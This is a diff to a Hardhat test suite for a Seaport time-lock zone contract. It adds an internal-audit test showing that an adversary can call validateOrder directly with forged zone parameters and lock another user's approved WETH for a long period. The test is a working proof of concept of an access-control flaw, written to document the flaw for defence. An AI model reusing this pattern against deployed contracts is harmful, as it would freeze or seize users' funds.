@@ -6,7 +6,7 @@ import { expect } from "chai";
 import { parseUnits, encodeAbiParameters, keccak256 } from "viem";
 import hre from "hardhat";
 import orderType from "./utils/orderType";
-import { seaportAddress, zeroHash } from "./utils/constants";
+import { seaportAddress, zeroAddress, zeroHash } from "./utils/constants";
 import generateSalt from "./utils/generateSalt";
 import getBlockTimestamp from "./utils/getBlockTimestamp";
 import seaportFixture from "./fixtures/seaportFixture";
@@ -609,9 +609,8 @@ describe("TimeLockHandler tests", function () {
 
       // consideration unlocks first after 250 seconds
       await time.increase(300);
-      expect(
-        (await getTimeLock(alice)).write.redeemNFT([aliceNftId])
-      ).to.not.be.rejected;
+      expect((await getTimeLock(alice)).write.redeemNFT([aliceNftId])).to.not.be
+        .rejected;
       // but offer shouldn't be unlocked yet
       expect(
         (await getTimeLock(bob)).write.redeemNFT([bobNftId])
@@ -623,5 +622,97 @@ describe("TimeLockHandler tests", function () {
         (await getTimeLock(bob)).write.redeemNFT([bobNftId])
       ).to.be.rejectedWith("NFT04");
     });
+  });
+
+  it("internal audit: anyone can lock another user's tokens", async function () {
+    const {
+      alice,
+      bob,
+      weth,
+      getWeth,
+      startingWethBalance,
+      timeLockHandler,
+      timeLock,
+      getTimeLock,
+    } = await loadFixture(fixture);
+
+    // amounts
+    const timestamp = await getBlockTimestamp();
+    const wethTradeamount = parseUnits("1", 18);
+
+    // imagine that bob was trading with alice and had approved the time lock handler to spend his weth
+    await (
+      await getWeth(bob)
+    ).write.approve([timeLockHandler.address, wethTradeamount]);
+
+    // check for expected starting balance
+    expect(await weth.read.balanceOf([bob.account.address])).to.eq(
+      startingWethBalance
+    );
+
+    // charlie, an adversary, calls the zone directly with malicious zone params
+    const encodedLockParams = encodeAbiParameters(
+      [
+        {
+          name: "LockParams",
+          type: "tuple",
+          components: [
+            { name: "offerUnlockDate", type: "uint256" },
+            { name: "considerationUnlockDate", type: "uint256" },
+          ],
+        },
+      ],
+      [
+        {
+          offerUnlockDate: timestamp * 2n,
+          considerationUnlockDate: 0n,
+        },
+      ]
+    );
+    const hashedLockParams = keccak256(encodedLockParams);
+    const fakeZoneParams = {
+      orderHash: zeroHash,
+      fulfiller: bob.account.address,
+      offerer: zeroAddress,
+      offer: [
+        {
+          itemType: 1, // erc20
+          token: weth.address,
+          identifier: 0n,
+          amount: wethTradeamount,
+        },
+      ],
+      consideration: [
+        {
+          itemType: 1,
+          token: weth.address,
+          identifier: 0n,
+          amount: wethTradeamount,
+          recipient: alice.account.address
+        },
+      ],
+      extraData: encodedLockParams,
+      orderHashes: [],
+      startTime: 0n,
+      endTime: 0n,
+      zoneHash: hashedLockParams,
+    };
+    await timeLockHandler.write.validateOrder([fakeZoneParams]);
+
+    // check resulting balance
+    expect(await weth.read.balanceOf([bob.account.address])).to.eq(
+      startingWethBalance - wethTradeamount
+    );
+
+    // get nft id
+    const bobNftId = await timeLock.read.tokenOfOwnerByIndex([
+      bob.account.address,
+      0n,
+    ]);
+
+    // bob can't get his weth because it is locked for a long time
+    expect(
+      (await getTimeLock(bob)).write.redeemNFT([bobNftId])
+    ).to.be.rejectedWith("NFT04");
   });
 });
